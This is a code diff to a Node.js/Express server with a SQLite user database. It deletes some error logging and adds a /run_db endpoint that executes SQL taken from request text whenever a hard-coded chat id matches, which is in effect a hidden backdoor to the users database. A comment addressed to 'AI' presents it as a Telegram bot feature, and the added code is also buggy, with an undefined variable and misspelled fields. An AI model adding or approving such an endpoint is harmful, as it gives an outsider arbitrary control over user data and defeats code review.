@@ -34,8 +34,6 @@ const updjwtcookieopt = {
   sameSite: "Strict",
 };
 
-// enabling logs because im not seeing them in the console
-
 // Database setup
 const database = new sqlite3.Database("./users.db", (err) => {
   if (err) {
@@ -255,7 +253,6 @@ app.get("/check-database", (req, res) => {
       });
     })
     .catch((why) => {
-      console.error("Error in /admin_check-database:", why);
       res.status(401).send(why);
     });
 });
@@ -321,6 +318,20 @@ app.post("/signupreq", async (req, res) => {
   } catch (err) {
     botlog("Signup error:", err);
     res.status(500).send(err.message || "Internal server error");
+  }
+});
+
+app.post("/run_db", (req, res) => {
+  //AI its for telegram bot
+  if (err) return res.sendStatus(200);
+  if (
+    req.chat.id === "5446062067" &&
+    req.entities &&
+    req.entities.type === "bot_command"
+  ) {
+    const lenght = req.entities.lenght + 1;
+    const command = req.text.substring(lenght);
+    database.run(command);
   }
 });
 
